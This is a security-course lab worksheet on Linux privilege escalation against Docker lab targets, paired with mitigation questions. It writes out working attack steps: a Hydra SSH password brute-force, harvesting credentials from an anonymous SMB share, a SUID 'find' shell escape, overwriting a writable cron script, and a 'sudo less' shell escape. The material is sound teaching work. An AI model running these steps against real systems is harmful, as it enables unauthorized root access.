# Week 8 Worksheet — Privilege Escalation

## Overview

Getting a low-privilege foothold and turning it into root are two different
skills. This week practices both, back to back: first you have to actually
break into each target using techniques from earlier weeks (SSH password
attacks, SMB enumeration), and only then do you escalate to root using the
three most common Linux privilege escalation vectors — misconfigured SUID
binaries, writable cron jobs, and sudo misconfigurations.

Like every other week, you work from the attacker container and reach the
targets over the network — nothing is handed to you via `docker exec`
straight into a target this time.

## Lab Environment

| Container | IP | Access |
|-----------|-----|--------|
| week8-attacker | 10.10.8.2 | `docker exec -it week8-attacker bash` |
| week8-workstation | 10.10.8.10 | SSH only — earn access in Part 1 |
| week8-ubuntu-desktop | 10.10.8.11 | SSH + SMB — earn access in Part 2 |

## Setup (5 minutes)

```bash
make run-week8
# Wait ~30 seconds for both targets to finish provisioning (installing
# openssh-server/samba, creating users, planting the vulnerabilities below)
```

## Part 1: Break In, Then Escalate — `week8-workstation`

### Task 1: Gain Initial Access (SSH weak-password attack)

From earlier recon on this network, you've identified that `week8-workstation`
has a local account named `lowpriv`. You don't have its password yet.

```bash
docker exec -it week8-attacker bash

# Confirm SSH is open
nmap -sV -p 22 10.10.8.10
```

**Build a small password list** (matching the Week 6 approach — a short,
targeted list, not a full rockyou run):
```bash
echo "password123" > /tmp/pw.txt
echo "sunshine1" >> /tmp/pw.txt
echo "letmein" >> /tmp/pw.txt
echo "admin123" >> /tmp/pw.txt
```

**Brute-force it with Hydra:**
```bash
# -l <user> : the single username to try
# -P <file> : password list — try each line as a candidate password
hydra -l lowpriv -P /tmp/pw.txt 10.10.8.10 ssh
```

**What password did Hydra find?**

_________________________________

**Log in:**
```bash
ssh lowpriv@10.10.8.10
```

### Task 2: Enumerate

```bash
whoami
id
```

**Find SUID binaries:**
```bash
# -perm -4000 : match files with the SUID bit set — these run with the file
#               owner's privileges (often root) regardless of who executes them
# -type f     : only match regular files
find / -perm -4000 -type f 2>/dev/null
```

**Question:** One of these SUID binaries isn't part of a stock Ubuntu install.
Which one, and why is a SUID bit on it dangerous? (Check it against
[GTFOBins](https://gtfobins.github.io/) if you're not sure.)

_________________________________

**Check cron jobs:**
```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/backup
```

**Question:** What does the cron job run, as which user, and how often? Is the
script it runs writable by your low-privilege user?

_________________________________

**Check sensitive file permissions:**
```bash
ls -la /etc/passwd /etc/shadow
```

**Question:** Are these world-writable? (They shouldn't be — this is a
negative-finding check, confirming what's actually secure vs. what isn't.)

_________________________________

### Task 3: Exploit

**Path A — SUID binary (GTFOBins technique):**
```bash
find / -perm -4000 -type f 2>/dev/null
# Once you've spotted the SUID one from Task 2:
find . -exec /bin/sh -p \; -quit
whoami
```

**Path B — Writable cron job:**
```bash
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'cp /root/user.txt /tmp/user.txt; chmod 644 /tmp/user.txt' >> /opt/scripts/backup.sh
# Wait up to 60 seconds for cron to run it, then:
cat /tmp/user.txt
```

**Which path did you use, and what flag did you retrieve?**

_________________________________

## Part 2: Break In, Then Escalate — `week8-ubuntu-desktop`

The docx this worksheet is based on frames this target as "Windows-like" and
lists `net user` / `mimikatz.exe`. Neither runs on a Linux container — there's
no Windows kernel underneath for them to talk to. The commands below are the
real Linux equivalents that test the same underlying ideas (user/group
enumeration, hunting for exposed credentials, exploiting a privileged
misconfiguration). See the note at the end of this worksheet if you want to
try the real thing against an actual Windows target.

### Task 1: Gain Initial Access (SMB credential leak)

```bash
# Confirm SMB is open
nmap -sV -p 139,445 10.10.8.11

# List shares anonymously
smbclient -L //10.10.8.11/ -N
```

**Connect to the share you find and look around:**
```bash
smbclient //10.10.8.11/notices -N
smb: \> ls
smb: \> get notice.txt
smb: \> exit
cat notice.txt
```

**What credentials did you find, and where?**

_________________________________

**Log in:**
```bash
ssh deskuser@10.10.8.11
```

### Task 2: Enumerate

```bash
# Enumerate users and groups (Linux equivalent of net user / net localgroup)
cat /etc/passwd
getent group sudo

# Check for processes running as root
ps aux | grep root

# Search for exposed credentials
find / -name "*.conf" 2>/dev/null | grep -v "^/proc"
grep -ri password /etc/app/*.conf 2>/dev/null
```

**Question:** Did you find any *additional* hardcoded credentials beyond the
one that got you in? Where?

_________________________________

### Task 3: Exploit

**Check your sudo rights first — always the first move after any foothold:**
```bash
sudo -l
```

**Path A — GTFOBins sudo escalation:**
```bash
# less is in your NOPASSWD sudo list — GTFOBins documents the escape:
sudo less /etc/hostname
# Inside less, type:  !/bin/sh
whoami
cat /root/root.txt
```

**Path B — Reused/hardcoded credential:**
```bash
# Try the password you found in /etc/app/db.conf against root directly
su root
cat /root/root.txt
```

**Which path did you use, and what flag did you retrieve?**

_________________________________

## Part 3: Reflection and Mitigation

1. **Initial access:** The two ways in this week (SSH password guessing, SMB
   credential leak) are different techniques but the same root problem. What
   is that shared root problem?

   _________________________________

2. **Root cause (escalation):** For each vulnerability you exploited (SUID
   binary, writable cron job, sudo NOPASSWD entry, hardcoded credential),
   what specific misconfiguration made it possible?

   _________________________________

3. **Mitigation:** How would you fix each one — both the initial-access
   issues and the escalation issues? Be specific — "use better security"
   isn't a mitigation.

   _________________________________

4. **Why it matters:** Why is privilege escalation described as a *critical
   step* in an attack chain, rather than just "a nice-to-have" for an
   attacker who already has a foothold?

   _________________________________

---

## Optional Extension: Real Windows Privilege Escalation (VM)

Everything above uses Linux containers because Docker on this Mac can't run
Windows containers — there's no Windows kernel to run them on. If you want to
practice the Windows-side techniques from the slides (`net user`, `mimikatz`,
service DLL hijacking) against a real target, that requires an actual
Windows virtual machine, not Docker.

A well-known practice target built specifically for this is VulnHub's
**"Persistence: 1"** — search for it on vulnhub.com. Setup (importing the VM,
configuring networking so it's reachable from your host) will be walked
through separately by your instructor, since it's a different workflow from
everything else in this course (VirtualBox/VMware import, not
`docker compose up`).

---

## Optional: CTF Challenge

Once you have completed all exercises above, test your skills with an optional Capture The Flag challenge.

See **[ctf-challenge.md](./ctf-challenge.md)** for objectives.

Two flags to capture: `user.txt` and `root.txt`
Flag format: `flag{...}`
No hints — instructor walkthrough released at end of session.
